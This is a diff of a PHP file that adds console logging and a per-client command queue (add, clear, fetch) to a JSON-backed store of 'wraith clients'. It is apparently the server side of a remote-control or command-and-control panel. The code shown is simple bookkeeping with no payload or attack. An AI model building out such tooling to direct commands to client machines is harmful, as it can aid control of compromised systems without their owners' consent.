@@ -38,8 +38,18 @@ function write_db($newdb) {
 	file_put_contents(dirname(__FILE__)."/db.json", json_encode($newdb, JSON_PRETTY_PRINT));
 }
 
+// Append line to the console
+function console_append($context, $status, $data) {
+	$timestamp = time();
+	
+	$db = get_db();
+	array_push($db["console_contents"], [$context, $timestamp, $status, $data]);
+	
+	write_db($db);
+}
+
 // Add a wraith to db or modify existing wraith (if existing ID supplied) or remove if remove mode specified
-function wraithdb($id, $wraith, $mode="add/mod") {
+function wraithdb($id, $wraith, $mode="add/mod", $data=[]) {
 	$db=get_db();
 	if ($mode === "add/mod") {
 		$db["active_wraith_clients"][$id]=$wraith;
@@ -55,6 +65,14 @@ function wraithdb($id, $wraith, $mode="add/mod") {
 		} else {
 			return false;
 		}
+	} elseif ($mode === "addcmd") {
+		array_push($db["active_wraith_clients"][$id]["command_queue"], $data);
+		write_db($db);
+	} elseif ($mode === "rmcmds") {
+		$db["active_wraith_clients"][$id]["command_queue"] = [];
+		write_db($db);
+	} elseif ($mode === "getcmd") {
+		return $db["active_wraith_clients"][$id]["command_queue"];
 	}
 }
 
